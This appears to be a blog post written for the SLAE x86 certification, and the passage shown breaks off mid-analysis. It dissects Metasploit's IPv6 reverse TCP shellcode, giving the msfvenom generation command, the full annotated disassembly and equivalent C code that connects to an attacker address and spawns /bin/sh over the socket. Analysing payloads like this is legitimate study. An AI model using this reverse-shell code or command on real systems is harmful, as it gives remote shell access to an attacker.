<!DOCTYPE html>
<html>
  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>SLAE x86 Exam - Assignment #5 Part 4</title>
    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">

    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
    <link rel="canonical" href="/21/12/25/slae32-assignment-5_4">
    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />

    <style>
         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "â€¢"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
    </style>
</head>

  <body>
    <!--- Header and nav template site-wide -->
<header>
    <a href="/">RBCT</a>

    <nav class="group">
        
            
        
            
                
                <a href="/">POSTS</a>
                
            
        
            
                
                <a href="/about/">ABOUT</a>
                
            
        
    </nav>
</header>
    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
        <h1>SLAE x86 Exam - Assignment #5 Part 4</h1>

        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
            <span class="mono authors">
                <a href="/author/rbct" itemprop="name">rbct</a>
            </span>
        </div>

        <time class="mono" datetime="2021-12-25T00:00:00+01:00" itemProp="datePublished">
            25 December 2021
        </time>

        <hr>
        <main itemprop="articleBody" style="position: relative;">
            <h2 id="disclaimer">Disclaimer</h2>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
<p>Student ID: PA-30398</p>
<h2 id="foreword">Foreword</h2>
<p>The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays <code>msfvenom</code>) for 32-bit Linux systems.</p>
<p>Programs like <code>gdb</code>/<code>ndisasm</code>/<code>libemu</code> can be used for dissecting the shellcode and performing the analysis.</p>
<p>I chose the following 4 shellcode samples:</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x86/adduser</td>
<td>Create a new user with UID 0</td>
</tr>
<tr>
<td>linux/x86/shell/reverse_nonx_tcp</td>
<td>Spawn a command shell (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x86/shell_find_tag</td>
<td>Spawn a shell on an established connection (proxy/nat safe)</td>
</tr>
<tr>
<td>linux/x86/shell_reverse_tcp_ipv6</td>
<td>Connect back to attacker and spawn a command shell over IPv6</td>
</tr>
</tbody>
</table>
<p>In this post I'll analyse <code>linux/x86/shell_reverse_tcp_ipv6</code>.</p>
<h2 id="analysis">Analysis</h2>
<h3 id="ndisasm">NDISASM</h3>
<p>To generate the payload:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> linux/x86/shell_reverse_tcp_ipv6 <span class="nv">LHOST</span><span class="o">=</span>fe80::250:56ff:fe22:364b <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-o</span> shellcode.bin
</code></pre></div></div>
<p>To analyse it with <code>ndisasm</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ndisasm shellcode.bin <span class="nt">-b</span> 32 <span class="nt">-p</span> intel
</code></pre></div></div>
<p>It returns the following output (comments are mine though):</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; EDX:EAX = EBX * 0</span>
<span class="err">00000000</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
<span class="err">00000002</span>  <span class="nf">F7E3</span>              <span class="nv">mul</span> <span class="nb">ebx</span>
</code></pre></div></div>
<p><sub class='aside'>Useful for polymorphism: besides <code>EBX</code>, they clear <code>EAX</code> and <code>EDX</code> too
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; IPPROTO_TCP</span>
<span class="err">00000004</span>  <span class="err">6</span><span class="nf">A06</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x6</span>

                            <span class="c1">; SOCK_STREAM</span>
<span class="err">00000006</span>  <span class="err">6</span><span class="nf">A01</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x1</span>

                            <span class="c1">; AF_INET6</span>
<span class="err">00000008</span>  <span class="err">6</span><span class="nf">A0A</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xa</span>

                            <span class="c1">; pointer to arguments of socket()</span>
<span class="err">0000000</span><span class="nf">A</span>  <span class="mi">89</span><span class="nv">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; call socketcall(SYS_SOCKET, ...)</span>
<span class="err">0000000</span><span class="nf">C</span>  <span class="nv">B066</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x66</span>
<span class="err">0000000</span><span class="nf">E</span>  <span class="nv">B301</span>              <span class="nv">mov</span> <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>

                            <span class="c1">; C code: socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);</span>
<span class="err">00000010</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>The instructions above create a <code>TCP</code> socket based on the <code>IPv6</code> protocol. The return value, stored into the register <code>EAX</code> (and later moved into <code>ESI</code>), is a file descriptor.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; save File Descriptor of the socket</span>
<span class="err">00000012</span>  <span class="err">89</span><span class="nf">C6</span>              <span class="nv">mov</span> <span class="nb">esi</span><span class="p">,</span><span class="nb">eax</span>

                            <span class="c1">; clear ECX and EBX and push 0x00000000 to the stack</span>
<span class="err">00000014</span>  <span class="err">31</span><span class="nf">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
<span class="err">00000016</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
<span class="err">00000018</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
</code></pre></div></div>
<p><sub class='aside'>I don't know exactly why the author pushed the DWORD <code>0x00000000</code> two times, thus making the struct 32-bytes long, when the size should be only 28 bytes. If you know, please contact me.
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; bytes 24-27 of the sockaddr_in6 struct:</span>
                            <span class="c1">;   value of sin6_scope_id: 0x00000000</span>
<span class="err">00000019</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>
</code></pre></div></div>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; bytes 8-23 of the sockaddr_in6 struct:</span>
                            <span class="c1">;    value of sin6_addr: fe80::250:56ff:fe22:364b (big-endian)</span>
<span class="err">0000001</span><span class="nf">A</span>  <span class="mi">68</span><span class="nv">FE22364B</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x4b3622fe</span>
<span class="err">0000001</span><span class="nf">F</span>  <span class="mi">68025056</span><span class="nv">FF</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0xff565002</span>
<span class="err">00000024</span>  <span class="err">6</span><span class="nf">A00</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x0</span>
<span class="err">00000026</span>  <span class="err">68</span><span class="nf">FE800000</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x80fe</span>
</code></pre></div></div>
<p><sub class='aside'>Bytes in big-endian order representing the IPv6 address: <code>fe80::250:56ff:fe22:364b</code>
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; bytes 4-7 of the sockaddr_in6 struct:</span>
                            <span class="c1">;   value of sin6_flowinfo: 0x00000000</span>
<span class="err">0000002</span><span class="nf">B</span>  <span class="mi">53</span>                <span class="nv">push</span> <span class="nb">ebx</span>

                            <span class="c1">; bytes 2-3 of the sockaddr_in6 struct:</span>
                            <span class="c1">;   value of sin6_port: port 4444 in big-endian order</span>
<span class="err">0000002</span><span class="nf">C</span>  <span class="mi">6668115</span><span class="nv">C</span>          <span class="nv">push</span> <span class="kt">word</span> <span class="mh">0x5c11</span>

                            <span class="c1">; bytes 0-1 of the sockaddr_in6 struct:</span>
                            <span class="c1">;   value of sin6_family: AF_INET6</span>
<span class="err">00000030</span>  <span class="err">66680</span><span class="nf">A00</span>          <span class="nv">push</span> <span class="kt">word</span> <span class="mh">0xa</span>

                            <span class="c1">; save the pointer to the sockaddr_in6 struct into ECX</span>
<span class="err">00000034</span>  <span class="err">89</span><span class="nf">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; 3rd argument of connect():</span>
                            <span class="c1">;   size of the sockaddr_in6 struct (28 bytes): </span>
<span class="err">00000036</span>  <span class="err">6</span><span class="nf">A1C</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0x1c</span>

                            <span class="c1">; 2nd argument of connect():</span>
                            <span class="c1">;   pointer to the sockaddr_in6 struct</span>
<span class="err">00000038</span>  <span class="err">51</span>                <span class="nf">push</span> <span class="nb">ecx</span>

                            <span class="c1">; 1st argument of connect():</span>
                            <span class="c1">;   File Descriptor of the client socket</span>
<span class="err">00000039</span>  <span class="err">56</span>                <span class="nf">push</span> <span class="nb">esi</span>

                            <span class="c1">; clear registers</span>
<span class="err">0000003</span><span class="nf">A</span>  <span class="mi">31</span><span class="nv">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
<span class="err">0000003</span><span class="nf">C</span>  <span class="mi">31</span><span class="nv">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>

                            <span class="c1">; socketcall() syscall</span>
<span class="err">0000003</span><span class="nf">E</span>  <span class="nv">B066</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x66</span>

                            <span class="c1">; 1st argument of socketcall():</span>
                            <span class="c1">;   SYS_CONNECT call</span>
<span class="err">00000040</span>  <span class="nf">B303</span>              <span class="nv">mov</span> <span class="nb">bl</span><span class="p">,</span><span class="mh">0x3</span>

                            <span class="c1">; 2nd argument of socketcall():</span>
                            <span class="c1">;   pointer to the arguments of SYS_CONNECT</span>
<span class="err">00000042</span>  <span class="err">89</span><span class="nf">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; call socketcall() syscall, in turn calling connect(...)</span>
<span class="err">00000044</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>The disassembly I analysed up until now can be converted into the following C code:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// create an IPv6 socket</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>

<span class="c1">// allocate space for the struct containing IPv6 address and TCP port</span>
<span class="k">struct</span> <span class="nc">sockaddr_in6</span> <span class="n">addr</span><span class="p">;</span>

<span class="c1">// set the socket to use IPv6</span>
<span class="n">addr</span><span class="p">.</span><span class="n">sin6_family</span> <span class="o">=</span> <span class="n">AF_INET6</span><span class="p">;</span>

<span class="c1">// convert the TCP port number to big-endian (instead of little-endian)</span>
<span class="n">addr</span><span class="p">.</span><span class="n">sin6_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

<span class="c1">// convert the string to an IPv6 address (big-endian)</span>
<span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="s">"fe80::250:56ff:fe22:364b"</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">addr</span><span class="p">.</span><span class="n">sin6_addr</span><span class="p">));</span>

<span class="c1">// connect to fe80::250:56ff:fe22:364b:4444</span>
<span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
</code></pre></div></div>
<p>So, first it creates a <code>TCP socket</code> based on the <code>IPv6</code> protocol. After that, it connects the socket referred to by the file descriptor <code>fd</code> to the address identified by:</p>
<ul>
<li>IP address: <code>fe80::250:56ff:fe22:364b</code></li>
<li>TCP port: <code>4444</code></li>
</ul>
<p>Next, the function <code>dup2</code> is used for redirecting file descriptors.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EBX, setting it to 0</span>
<span class="err">00000046</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>

                            <span class="c1">; compare EAX with EBX, if they are equal,</span>
                            <span class="c1">;   the flag ZF will be set, as cmp</span>
                            <span class="c1">;   simply subtracts the bytes</span>
<span class="err">00000048</span>  <span class="err">39</span><span class="nf">D8</span>              <span class="nv">cmp</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">ebx</span>

                            <span class="c1">; if the flag ZF is set, and the two registers are equal,</span>
                            <span class="c1">;   then jumps to 00000082 (calls nanosleep())</span>
<span class="err">0000004</span><span class="nf">A</span>  <span class="mi">7536</span>              <span class="nv">jnz</span> <span class="mh">0x82</span>

                            <span class="c1">; 2nd argument of dup2():</span>
                            <span class="c1">;   newfd: file descriptor to be redirected,</span>
                            <span class="c1">;   in this case stdin</span>
<span class="err">0000004</span><span class="nf">C</span>  <span class="mi">31</span><span class="nv">C9</span>              <span class="nv">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>

                            <span class="c1">; clear ECX, EDX, EAX</span>
<span class="err">0000004</span><span class="nf">E</span>  <span class="nv">F7E1</span>              <span class="nv">mul</span> <span class="nb">ecx</span>

                            <span class="c1">; 1st argument of dup2():</span>
                            <span class="c1">;   oldfd, i.e. the destination of the redirection of</span>
                            <span class="c1">;   the file descriptor specified in the arg. newfd (ECX)</span>
<span class="err">00000050</span>  <span class="err">89</span><span class="nf">F3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esi</span>

                            <span class="c1">; call syscall dup2()</span>
<span class="err">00000052</span>  <span class="nf">B03F</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x3f</span>
<span class="err">00000054</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>Redirect <code>stdin</code> to the previously-created socket
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EAX</span>
<span class="err">00000056</span>  <span class="err">31</span><span class="nf">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>

                            <span class="c1">; 2nd argument of dup2(): stdout</span>
<span class="err">00000058</span>  <span class="err">41</span>                <span class="nf">inc</span> <span class="nb">ecx</span>

                            <span class="c1">; 1st argument of dup2(): the IPv6 socket</span>
<span class="err">00000059</span>  <span class="err">89</span><span class="nf">F3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esi</span>

                            <span class="c1">; call syscall dup2()</span>
<span class="err">0000005</span><span class="nf">B</span>  <span class="nv">B03F</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x3f</span>
<span class="err">0000005</span><span class="nf">D</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>Redirect <code>stdout</code> to the previously-created socket
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EAX</span>
<span class="err">0000005</span><span class="nf">F</span>  <span class="mi">31</span><span class="nv">C0</span>              <span class="nv">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>

                            <span class="c1">; 2nd argument of dup2(): stderr</span>
<span class="err">00000061</span>  <span class="err">41</span>                <span class="nf">inc</span> <span class="nb">ecx</span>

                            <span class="c1">; 1st argument of dup2(): the IPv6 socket</span>
<span class="err">00000062</span>  <span class="err">89</span><span class="nf">F3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esi</span>

<span class="err">00000064</span>  <span class="nf">B03F</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0x3f</span>
<span class="err">00000066</span>  <span class="nf">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>Redirect <code>stderr</code> to the previously-created socket
</sub></p>
<p>So far the disassembly I analysed is equal to the following C code:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</code></pre></div></div>
<p>Next, a shell is spawned.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EDX and EAX</span>
                            <span class="c1">; 3rd argument of execve(): envp</span>
                            <span class="c1">;   array of pointers to strings (env. variables)</span>
                            <span class="c1">; in this case it's a null pointer</span>
<span class="err">00000068</span>  <span class="err">31</span><span class="nf">D2</span>              <span class="nv">xor</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
<span class="err">0000006</span><span class="nf">A</span>  <span class="nv">F7E2</span>              <span class="nv">mul</span> <span class="nb">edx</span>

                            <span class="c1">; push a string to the stack and add 4 null bytes at the end</span>
                            <span class="c1">;   string: /bin//sh</span>
<span class="err">0000006</span><span class="nf">C</span>  <span class="mi">52</span>                <span class="nv">push</span> <span class="nb">edx</span>
<span class="err">0000006</span><span class="nf">D</span>  <span class="mi">682</span><span class="nv">F2F7368</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x68732f2f</span>
<span class="err">00000072</span>  <span class="err">682</span><span class="nf">F62696E</span>        <span class="nv">push</span> <span class="kt">dword</span> <span class="mh">0x6e69622f</span>

                            <span class="c1">; 1st argument of execve(): pathname, a pointer to the</span>
                            <span class="c1">;   executable to run</span>
<span class="err">00000077</span>  <span class="err">89</span><span class="nf">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; array of pointers to command-line arguments</span>
                            <span class="c1">;   - EBX -&gt; "/bin//sh"</span>
                            <span class="c1">;   - EDX -&gt; 0x00000000 </span>
<span class="err">00000079</span>  <span class="err">52</span>                <span class="nf">push</span> <span class="nb">edx</span>
<span class="err">0000007</span><span class="nf">A</span>  <span class="mi">53</span>                <span class="nv">push</span> <span class="nb">ebx</span>

                            <span class="c1">; 2nd argument of execve(): argv</span>
                            <span class="c1">;   array of pointers to strings (command-line arguments)</span>
<span class="err">0000007</span><span class="nf">B</span>  <span class="mi">89</span><span class="nv">E1</span>              <span class="nv">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; call execve() syscall</span>
<span class="err">0000007</span><span class="nf">D</span>  <span class="nv">B00B</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>
<span class="err">0000007</span><span class="nf">F</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>As for the second assignment, once the shellcode correctly redirected <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> to the file descriptor of the server socket (a Metasploit handler to be specific), it uses <code>execve</code> to spawn the reverse shell.</p>
<p>In this case it uses the shell <code>/bin//sh</code>, as the string occupies only <code>8 bytes</code>, but we could also replace it with <code>/bin/bash</code>.</p>
<p>If the shellcode can't connect to the remote server, then it jumps to the address <code>00000082</code>, which is the start of a block of assembly instructions that call the syscall <code>nanosleep()</code> in order to sleep for <code>10</code> seconds:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; I don't know why the use of this instruction.</span>
                            <span class="c1">; Once the shellcode spawns a shell, the code of the program</span>
                            <span class="c1">; should be replace, so it seems useless</span>
<span class="err">00000081</span>  <span class="nf">C3</span>                <span class="nv">ret</span>

                            <span class="c1">; clear EBX and push 0x00000000 to the stack</span>
<span class="err">00000082</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
<span class="err">00000084</span>  <span class="err">53</span>                <span class="nf">push</span> <span class="nb">ebx</span>  

                            <span class="c1">; push the DWORD 0x0000000a to the stack</span>
<span class="err">00000085</span>  <span class="err">6</span><span class="nf">A0A</span>              <span class="nv">push</span> <span class="kt">byte</span> <span class="o">+</span><span class="mh">0xa</span>

                            <span class="c1">; clear EAX and EDX</span>
<span class="err">00000087</span>  <span class="nf">F7E3</span>              <span class="nv">mul</span> <span class="nb">ebx</span>

                            <span class="c1">; 1st argument of nanosleep():</span>
                            <span class="c1">;   pointer to a timespec structure</span>
<span class="err">00000089</span>  <span class="err">89</span><span class="nf">E3</span>              <span class="nv">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span>

                            <span class="c1">; call nanosleep()</span>
<span class="err">0000008</span><span class="nf">B</span>  <span class="nv">B0A2</span>              <span class="nv">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xa2</span>
<span class="err">0000008</span><span class="nf">D</span>  <span class="nv">CD80</span>              <span class="nv">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>The interesting fact about <code>nanosleep</code> is that it doesn't simply use a integer to determine how many seconds/nanoseconds to sleep, but it uses a <code>struct</code>. According to the <a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">Linux manual</a>, it is structured as follows:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">timespec</span> <span class="p">{</span>
    <span class="kt">time_t</span> <span class="n">tv_sec</span><span class="p">;</span>        <span class="cm">/* seconds */</span>
    <span class="kt">long</span>   <span class="n">tv_nsec</span><span class="p">;</span>       <span class="cm">/* nanoseconds */</span>
<span class="p">};</span>
</code></pre></div></div>
<p>Based on a few files of the Linux kernel, the size of <code>time_t</code> should be <code>4 bytes</code> on 32-bit <code>x86</code> systems, same for the <code>long</code> type. So we're looking at a struct made out of <code>8 bytes</code>.</p>
<p>The first 4 bytes specify the number of <code>seconds</code> to sleep, while the other ones specify the number of <code>nanoseconds</code> to sleep.</p>
<p>Since the <code>stack</code> grows downward, we have to push the value of <code>tv_nsec</code> to the stack first, and then push the value of <code>tv_sec</code>. Let's look again at the struct:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                            <span class="c1">; clear EBX</span>
<span class="err">00000082</span>  <span class="err">31</span><span class="kd">DB</span>              <span class="nv">xor</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>

